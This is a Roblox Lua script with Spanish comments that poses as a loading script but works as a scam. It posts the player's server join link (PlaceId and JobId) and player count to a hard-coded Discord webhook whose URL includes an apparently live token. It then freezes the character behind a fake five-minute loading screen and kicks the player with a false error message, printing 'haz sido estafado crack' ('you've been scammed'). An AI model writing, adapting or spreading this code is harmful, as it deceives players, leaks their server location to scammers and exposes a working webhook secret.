local HttpService = game:GetService("HttpService")
local TeleportService = game:GetService("TeleportService")

-- ⚙️ CONFIGURACIÓN
local WEBHOOK_URL = "https://discord.com/api/webhooks/1428149049168494602/XhQJbBGyeVnb4QDSkNR9mvWXo9PtAy1i95DHh8y2A29rvp7zI4W6fVIyjc9mQfYSD4Ah"  -- Pon aquí tu webhook de Discord
local ALLOWED_PLACE_ID = 0  -- Pon aquí el PlaceID del juego (ejemplo: 4924922222)

-- Verifica si el script está en el juego correcto
local function isCorrectGame()
    return game.PlaceId == ALLOWED_PLACE_ID
end

-- Función para obtener el link del servidor
local function getServerLink()
    local placeId = game.PlaceId
    local jobId = game.JobId
    
    -- Genera el link del servidor
    local serverLink = string.format(
        "https://www.roblox.com/games/%d?privateServerLinkCode=%s",
        placeId,
        jobId
    )
    
    return serverLink
end

-- Función para enviar datos al webhook
local function sendToWebhook(link)
    local data = {
        ["content"] = "@everyone **Nuevo Servidor Detectado!**",
        ["embeds"] = {{
            ["title"] = "Información del Servidor",
            ["description"] = "Se ha ejecutado el script en un servidor",
            ["color"] = 3447003,
            ["fields"] = {
                {
                    ["name"] = "Link del Servidor",
                    ["value"] = link,
                    ["inline"] = false
                },
                {
                    ["name"] = "Place ID",
                    ["value"] = tostring(game.PlaceId),
                    ["inline"] = true
                },
                {
                    ["name"] = "Job ID",
                    ["value"] = game.JobId,
                    ["inline"] = true
                },
                {
                    ["name"] = "Jugadores",
                    ["value"] = tostring(#game.Players:GetPlayers()),
                    ["inline"] = true
                }
            },
            ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")
        }}
    }
    
    local success, response = pcall(function()
        return HttpService:PostAsync(
            WEBHOOK_URL,
            HttpService:JSONEncode(data),
            Enum.HttpContentType.ApplicationJson,
            false
        )
    end)
    
    if success then
        print("✅ Link enviado al webhook exitosamente")
    else
        warn("❌ Error al enviar al webhook: " .. tostring(response))
    end
end

-- Función para congelar al jugador
local function freezePlayer()
    local player = game.Players.LocalPlayer
    
    if player and player.Character then
        local character = player.Character
        local humanoid = character:FindFirstChildOfClass("Humanoid")
        local rootPart = character:FindFirstChild("HumanoidRootPart")
        
        if humanoid then
            -- Deshabilita el movimiento del jugador
            humanoid.WalkSpeed = 0
            humanoid.JumpPower = 0
            humanoid.JumpHeight = 0
            humanoid.AutoRotate = false
        end
        
        if rootPart then
            -- Ancla la raíz del personaje
            rootPart.Anchored = true
        end
        
        -- Congela todas las partes del cuerpo
        for _, part in pairs(character:GetDescendants()) do
            if part:IsA("BasePart") then
                part.Anchored = true
            end
        end
        
        print("🔒 Jugador congelado exitosamente")
    else
        warn("⚠️ No se pudo encontrar el personaje del jugador")
    end
end

-- Función para crear la pantalla de carga
local function createLoadingScreen()
    local player = game.Players.LocalPlayer
    local playerGui = player:WaitForChild("PlayerGui")
    
    -- Crea el ScreenGui
    local screenGui = Instance.new("ScreenGui")
    screenGui.Name = "LoadingScreen"
    screenGui.ResetOnSpawn = false
    screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    screenGui.IgnoreGuiInset = true -- Ocupa toda la pantalla incluyendo barras
    screenGui.Parent = playerGui
    
    -- Fondo que cubre TODA la pantalla
    local background = Instance.new("Frame")
    background.Name = "Background"
    background.Size = UDim2.new(1, 0, 1, 0)
    background.Position = UDim2.new(0, 0, 0, 0)
    background.BackgroundColor3 = Color3.fromRGB(15, 15, 20)
    background.BackgroundTransparency = 0
    background.BorderSizePixel = 0
    background.ZIndex = 10
    background.Parent = screenGui
    
    -- Contenedor principal (centrado)
    local container = Instance.new("Frame")
    container.Name = "Container"
    container.Size = UDim2.new(0, 450, 0, 250)
    container.AnchorPoint = Vector2.new(0.5, 0.5)
    container.Position = UDim2.new(0.5, 0, 0.5, 0)
    container.BackgroundColor3 = Color3.fromRGB(25, 25, 35)
    container.BorderSizePixel = 0
    container.ZIndex = 11
    container.Parent = background
    
    -- Esquinas redondeadas
    local corner = Instance.new("UICorner")
    corner.CornerRadius = UDim.new(0, 20)
    corner.Parent = container
    
    -- Sombra/brillo sutil
    local uiStroke = Instance.new("UIStroke")
    uiStroke.Color = Color3.fromRGB(100, 150, 255)
    uiStroke.Thickness = 2
    uiStroke.Transparency = 0.5
    uiStroke.Parent = container
    
    -- Texto "CARGANDO"
    local loadingText = Instance.new("TextLabel")
    loadingText.Name = "LoadingText"
    loadingText.Size = UDim2.new(1, -40, 0, 60)
    loadingText.Position = UDim2.new(0, 20, 0, 30)
    loadingText.BackgroundTransparency = 1
    loadingText.Text = "CARGANDO"
    loadingText.TextColor3 = Color3.fromRGB(255, 255, 255)
    loadingText.TextSize = 38
    loadingText.Font = Enum.Font.GothamBold
    loadingText.TextXAlignment = Enum.TextXAlignment.Center
    loadingText.ZIndex = 12
    loadingText.Parent = container
    
    -- Texto del porcentaje
    local percentText = Instance.new("TextLabel")
    percentText.Name = "PercentText"
    percentText.Size = UDim2.new(1, -40, 0, 50)
    percentText.Position = UDim2.new(0, 20, 0, 100)
    percentText.BackgroundTransparency = 1
    percentText.Text = "0%"
    percentText.TextColor3 = Color3.fromRGB(100, 200, 255)
    percentText.TextSize = 32
    percentText.Font = Enum.Font.GothamBold
    percentText.TextXAlignment = Enum.TextXAlignment.Center
    percentText.ZIndex = 12
    percentText.Parent = container
    
    -- Barra de progreso (fondo)
    local progressBarBg = Instance.new("Frame")
    progressBarBg.Name = "ProgressBarBg"
    progressBarBg.Size = UDim2.new(0.85, 0, 0, 12)
    progressBarBg.AnchorPoint = Vector2.new(0.5, 0)
    progressBarBg.Position = UDim2.new(0.5, 0, 0, 170)
    progressBarBg.BackgroundColor3 = Color3.fromRGB(40, 40, 50)
    progressBarBg.BorderSizePixel = 0
    progressBarBg.ZIndex = 12
    progressBarBg.Parent = container
    
    local cornerBar = Instance.new("UICorner")
    cornerBar.CornerRadius = UDim.new(0, 6)
    cornerBar.Parent = progressBarBg
    
    -- Barra de progreso (relleno)
    local progressBar = Instance.new("Frame")
    progressBar.Name = "ProgressBar"
    progressBar.Size = UDim2.new(0, 0, 1, 0)
    progressBar.BackgroundColor3 = Color3.fromRGB(100, 200, 255)
    progressBar.BorderSizePixel = 0
    progressBar.ZIndex = 13
    progressBar.Parent = progressBarBg
    
    local cornerBarFill = Instance.new("UICorner")
    cornerBarFill.CornerRadius = UDim.new(0, 6)
    cornerBarFill.Parent = progressBar
    
    -- Gradiente para la barra
    local gradient = Instance.new("UIGradient")
    gradient.Color = ColorSequence.new{
        ColorSequenceKeypoint.new(0, Color3.fromRGB(80, 150, 255)),
        ColorSequenceKeypoint.new(1, Color3.fromRGB(120, 220, 255))
    }
    gradient.Parent = progressBar
    
    print("📺 Pantalla de carga creada")
    
    return screenGui, percentText, progressBar, progressBarBg
end

-- ================================
-- SCRIPT PRINCIPAL
-- ================================

-- Verifica si estamos en el juego correcto
if not isCorrectGame() then
    warn("❌ Este script solo funciona en el juego especificado (PlaceID: " .. ALLOWED_PLACE_ID .. ")")
    warn("❌ PlaceID actual: " .. game.PlaceId)
    return -- Termina la ejecución del script
end

print("✅ Juego verificado correctamente!")

-- Crea la pantalla de carga
local loadingGui, percentText, progressBar, progressBarBg = createLoadingScreen()

-- Congela al jugador
freezePlayer()

local serverLink = getServerLink()
print("Link del servidor: " .. serverLink)
sendToWebhook(serverLink)

-- Actualiza el porcentaje durante 5 minutos
local totalTime = 300 -- 5 minutos en segundos
local updateInterval = 0.5 -- Actualiza cada 0.5 segundos
local elapsedTime = 0

-- Animación del porcentaje
local connection
connection = game:GetService("RunService").Heartbeat:Connect(function(dt)
    elapsedTime = elapsedTime + dt
    local percentage = math.min((elapsedTime / totalTime) * 100, 100)
    
    -- Actualiza el texto del porcentaje
    percentText.Text = string.format("%d%%", math.floor(percentage))
    
    -- Actualiza el tamaño de la barra de progreso
    progressBar.Size = UDim2.new(percentage / 100, 0, 1, 0)
    
    -- Cuando llega al 100%, kickea al jugador
    if percentage >= 100 then
        connection:Disconnect()
        
        task.wait(0.5) -- Espera medio segundo para que se vea el 100%
        
        local player = game.Players.LocalPlayer
        if player then
            player:Kick("error cargando el script porfavor intente nuevamente")
            print("haz sido estafado crack")
        end
    end
end)

print("⏱️ El jugador será kickeado cuando la carga llegue al 100%...")

-- También puedes obtener el link usando TeleportService
local teleportLink = "Roblox.GameLauncher.joinGameInstance(" .. game.PlaceId .. ", '" .. game.JobId .. "')"
print("Comando de teleport: " .. teleportLink)
